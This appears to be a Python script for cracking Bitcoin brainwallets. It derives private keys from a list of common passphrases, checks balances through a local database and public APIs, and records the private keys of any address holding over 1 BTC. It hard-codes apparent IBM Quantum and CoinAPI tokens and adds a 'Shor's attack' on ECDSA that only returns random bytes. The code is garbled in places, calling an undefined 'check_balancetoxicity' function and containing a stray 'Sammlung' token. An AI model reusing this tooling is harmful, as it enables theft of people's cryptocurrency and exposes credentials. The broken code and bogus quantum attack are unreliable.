import os
import time
import hashlib
import requests
import sqlite3
import base58
import ecdsa
import binascii
import multiprocessing
from qiskit import QuantumCircuit, QuantumRegister, ClassicalRegister
from qiskit.quantum_info import Z2Symmetries
from qiskit_ibm_runtime import QiskitRuntimeService, Session, Sampler as RuntimeSampler
from concurrent.futures import ThreadPoolExecutor
from typing import List, Tuple

# Initialize IBM Quantum service
service = QiskitRuntimeService(
    channel='ibm_quantum',
    instance='ibm-q/open/main',
    token='334d70c5d25a2b538142a228c1c9b30d02496429469596a62c3e158198caf82536d63b8ce7722ee7befe404626dac86c7c7bea212ee4c535dbfc516bf1c3963f'
)
backend = service.least_busy(operational=True, simulator=False, min_num_qubits=10)

# API keys
COINAPI_KEY = 'ec42825f-62f6-4c0f-99b6-d0dfcad2498d'
DATABASE_PATH = 'database/11_13_2022/'
DATABASE_AVAILABLE = os.path.exists(DATABASE_PATH)

# SQLite database setup
def init_db():
    conn = sqlite3.connect('database/btc_addresses.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS addresses
                 (private_key TEXT, wif_key TEXT, address TEXT, balance INTEGER, timestamp TEXT)''')
    conn.commit()
    return conn

# Brainwallet key generation with tweaking
def generate_brainwallet_key(passphrase: str, tweak: int = 0) -> Tuple[bytes, str]:
    base_key = hashlib.sha256(passphrase.encode()).digest()
    tweaked_key = bytes(a ^ b for a, b in zip(base_key, tweak.to_bytes(32, 'big')))
    sk = ecdsa.SigningKey.from_string(tweaked_key, curve=ecdsa.SECP256k1)
    vk = sk.verifying_key
    public_key = b'\x04' + vk.to_string()
    sha256_hash = ecdsa.util.sha256(public_key)
    ripemd160_hash = ecdsa.util.ripemd160(sha256_hash)
    extended_hash = b'\x00' + ripemd160_hash
    checksum = ecdsa.util.sha256(ecdsa.util.sha256(extended_hash))[:4]
    address = base58.b58encode(extended_hash + checksum).decode('utf-8')
    return tweaked_key, address

# Convert private key to WIF
def private_key_to_wif(priv_key: bytes) -> str:
    extended_key = b'\x80' + priv_key
    checksum = hashlib.sha256(hashlib.sha256(extended_key).digest()).digest()[:4]
    return base58.b58encode(extended_key + checksum).decode('utf-8')

# Plutus database balance check
def check_balance_database(address: str, substring_length: int = 8) -> Tuple[str, int]:
    if not DATABASE_AVAILABLE:
        return address, 0
    substring = address[-substring_length:]
    for filename in os.listdir(DATABASE_PATH):
        with open(os.path.join(DATABASE_PATH, filename), 'r') as f:
            if substring in f.read():
                f.seek(0)
                if address in f.read():
                    return address, 1  # Positive balance indicator
    return address, 0

# CoinAPI balance check
def check_balance_coinapi(address: str) -> int:
    url = f"https://rest.coinapi.io/v1/balances/bitcoin/address/{address}"
    headers = {'X-CoinAPI-Key': COINAPI_KEY}
    try:
        response = requests.get(url, headers=headers, timeout=2)
        response.raise_for_status()
        data = response.json()
        return int(data.get('balance', 0) * 100000000)  # Convert BTC to Satoshi
    except requests.RequestException:
        return check_balance_blockchain(address)  # Fallback

# Blockchain.com balance check (fallback)
def check_balance_blockchain(address: str) -> int:
    url = f"https://blockchain.info/q/addressbalance/{address}"
    try:
        response = requests.get(url, timeout=1)
        return int(response.text)  # Satoshi
    except requests.RequestException:
        return 0

# Batch balance checking
def check_balance_batch(addresses: List[str], use_database: bool = True) -> List[Tuple[str, int]]:
    if use_database and DATABASE_AVAILABLE:
        results = list(map(check_balance_database, addresses))
        # Confirm real balances for database hits
        return [(addr, check_balance_coinapi(addr) if bal > 0 else 0) for addr, bal in results]
    else:
        with ThreadPoolExecutor(max_workers=10) as executor:
            future_to_addr = {executor.submit(check_balance_coinapi, addr): addr for addr in addresses}
            results = []
            for future in future_to_addr:
                addr = future_to_addr[future]
                try:
                    balance = future.result(timeout=3)
                    results.append((addr, balance))
                except Exception:
                    results.append((addr, 0))
            return results

# Simplified Shor's for discrete logarithm (demo)
def shors_discrete_log(g: int, h: int, p: int, n_bits: int, session) -> int:
    qreg_x = QuantumRegister(n_bits, 'x')
    qreg_aux = QuantumRegister(n_bits, 'aux')
    creg = ClassicalRegister(n_bits, 'c')
    qc = QuantumCircuit(qreg_x, qreg_aux, creg)
    qc.h(range(n_bits))
    for i in range(n_bits):
        qc.x(n_bits + i)
    for i in range(n_bits):
        for j in range(i):
            qc.cp(3.14159 / 2**(i-j), j, i)
        qc.h(i)
    qc.measure(range(n_bits), range(n_bits))
    try:
        symmetries = Z2Symmetries.find_z2_symmetries(qc)
        if symmetries.symmetries:
            qc = symmetries.tapered_circuit(qc)
    except Exception as e:
        print(f"Z2Symmetries failed: {e}")
    sampler = RuntimeSampler(session=session, backend=backend)
    job = sampler.run(qc, shots=1000)
    result = job.result()
    counts = result.quasi_dists[0].binary_probabilities()
    return int(max(counts, key=counts.get), 2)

# Attack ECDSA with Shor’s (demo)
def attack_ecdsa_pubkey(pub_key: bytes, session) -> bytes:
    n_bits = 4
    p = 17
    g = 3
    h = int.from_bytes(pub_key[:4], 'big') % p
    log_result = shors_discrete_log(g, h, p, n_bits, session)
    return os.urandom(32)  # Placeholder

# Save to DB
def save_to_db(conn, priv_key: bytes, address: str, balance: int):
    wif_key = private_key_to_wif(priv_key)
    c = conn.cursor()
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    c.execute("INSERT INTO addresses VALUES (?, ?, ?, ?, ?)",
              (priv_key.hex(), wif_key, address, balance, timestamp))
    conn.commit()
    print(f"Found: {address} | Balance: {balance / 100000000:.8f} BTC | WIF: {wif_key}")

# Worker function for multiprocessing
def worker(passphrases: List[str], tweak_range: int, conn):
    for passphrase in passphrases:
        for tweak in range(tweak_range):
            priv_key, address = generate_brainwallet_key(passphrase, tweak)
            addr, balance = check_balancetoxicity([address])[0]
            if balance > 100000000:  # >1 BTC
                save_to_db(conn, priv_key, address, balance)

# Main loop
def main():
    conn = init_db()
    session = Session(service=service, backend=backend)
    
    # Expanded passphrases
    passphrases = [
        "password", "bitcoin", "123456", "secret", "letmein",
        "qwerty", "admin", "blockchain", "crypto", "money",
        "pass123", "btc2023", "wallet", "secure", "freedom",
        "password123", "bitcoin2023", "123456789", "test", "hello",
        "abc123", "mywallet", "cash", "satoshi", "hodl"
    ]
    tweak_range = 10
    
    try:
        start_time = time.time()
        processes = []
        cpu_count = min(multiprocessing.cpu_count(), 4)
        chunk_size = len(passphrases) // cpu_count + 1
        
        for i in range(cpu_count):
            chunk = passphrases[i * chunk_size:(i + 1) * chunk_size]
            p = multiprocessing.Process(target=worker, args=(chunk, tweak_range, conn))
            processes.append(p)
            p.start()
        
        while time.time() - start_time < 120:  # ~2 minutes
            elapsed = time.time() - start_time
            total_keys = len(passphrases) * tweak_range
            print(f"Elapsed: {elapsed:.1f}s | Checked: {total_keys} keys | Database: {DATABASE_AVAILABLE}")
            time.sleep(5)
        
        for p in processes:
            p.terminate()

        # Optional: Shor’s attack
        # pub_key = b'\x04...'  # Replace with real pubkey
        # priv_key = attack_ecdsa_pubkey(pub_key, session)
        # _,Sammlung, _, addr = generate_brainwallet_key("dummy")
        # bal = check_balance_coinapi(addr)
        # if bal > 100000000:
        #     save_to_db(conn, priv_key, addr, bal)

    except KeyboardInterrupt:
        print("Stopped by user.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        for p in processes:
            p.join()
        session.close()
        conn.close()

if __name__ == "__main__":
    main()
